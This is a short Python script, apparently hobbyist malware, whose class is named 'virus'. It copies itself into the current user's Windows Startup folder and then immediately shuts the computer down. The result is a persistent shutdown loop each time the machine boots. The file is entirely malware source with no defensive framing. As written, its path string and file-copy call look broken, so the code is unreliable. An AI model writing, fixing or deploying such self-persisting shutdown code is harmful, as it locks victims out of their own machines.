
from shutil import copyfile
from getpass import getuser
import os
#==============================
class virus:

    def __init__(self) -> None:
        
        self.setting_information()

        self.shutingdown_func()

    def setting_information(self):

        user = getuser()

        startup = 'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(user)

        self.copy_file(startup)

    def shutingdown_func(self):

        os.system('shutdown /s /t 1')

    def copy_file(self, path_of_starttup):

        copyfile(__file__, path_of_starttup)     